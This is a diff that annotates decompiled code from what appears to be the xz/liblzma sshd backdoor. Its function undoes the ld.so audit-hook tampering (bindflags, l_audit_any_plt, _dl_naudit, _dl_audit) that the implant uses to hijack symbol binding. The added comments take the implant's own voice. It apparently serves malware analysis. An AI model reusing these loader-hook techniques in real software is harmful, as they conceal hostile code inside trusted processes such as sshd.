@@ -16,28 +16,34 @@
 void init_ldso_ctx(ldso_ctx_t *ldso_ctx)
 
 {
-  u32 *libcrypto_bindflags_ptr;
-  byte *audit_flag_byte;
+  u32 *libcrypto_bindflags_slot;
+  byte *sshd_audit_flag_byte;
   
   if (ldso_ctx != (ldso_ctx_t *)0x0) {
-    libcrypto_bindflags_ptr = ldso_ctx->libcrypto_auditstate_bindflags_ptr;
-    if (libcrypto_bindflags_ptr != (u32 *)0x0) {
-      *libcrypto_bindflags_ptr = ldso_ctx->libcrypto_auditstate_bindflags_old_value;
+    libcrypto_bindflags_slot = ldso_ctx->libcrypto_auditstate_bindflags_ptr;
+    if (libcrypto_bindflags_slot != (u32 *)0x0) {
+      // AutoDoc: Reapply the saved libcrypto bindflags so ld.so’s audit hooks see their original mask.
+      *libcrypto_bindflags_slot = ldso_ctx->libcrypto_auditstate_bindflags_old_value;
       if (ldso_ctx->libcrypto_l_name != (char **)0x0) {
-        *ldso_ctx->libcrypto_l_name = (char *)libcrypto_bindflags_ptr;
+        // AutoDoc: Undo the byte we NUL’d inside `l_name` while the hooks were active.
+        *ldso_ctx->libcrypto_l_name = (char *)libcrypto_bindflags_slot;
       }
     }
     if (ldso_ctx->sshd_auditstate_bindflags_ptr != (u32 *)0x0) {
+      // AutoDoc: Mirror the same restoration for sshd’s auditstate structure.
       *ldso_ctx->sshd_auditstate_bindflags_ptr = ldso_ctx->sshd_auditstate_bindflags_old_value;
     }
-    audit_flag_byte = (byte *)ldso_ctx->sshd_link_map_l_audit_any_plt_addr;
-    if (audit_flag_byte != (byte *)0x0) {
-      *audit_flag_byte = *audit_flag_byte & ~ldso_ctx->link_map_l_audit_any_plt_bitmask;
+    sshd_audit_flag_byte = (byte *)ldso_ctx->sshd_link_map_l_audit_any_plt_addr;
+    if (sshd_audit_flag_byte != (byte *)0x0) {
+      // AutoDoc: Clear the `l_audit_any_plt` bit the loader set so `_dl_audit` stops forcing our trampolines.
+      *sshd_audit_flag_byte = *sshd_audit_flag_byte & ~ldso_ctx->link_map_l_audit_any_plt_bitmask;
     }
     if (ldso_ctx->_dl_naudit_ptr != (uint *)0x0) {
+      // AutoDoc: Drop `_dl_naudit` back to zero so ld.so forgets about the registered audit module.
       *ldso_ctx->_dl_naudit_ptr = 0;
     }
     if (ldso_ctx->_dl_audit_ptr != (audit_ifaces **)0x0) {
+      // AutoDoc: NULL out `_dl_audit` as well so future binds can’t reach into freed hook tables.
       *ldso_ctx->_dl_audit_ptr = (audit_ifaces *)0x0;
     }
   }
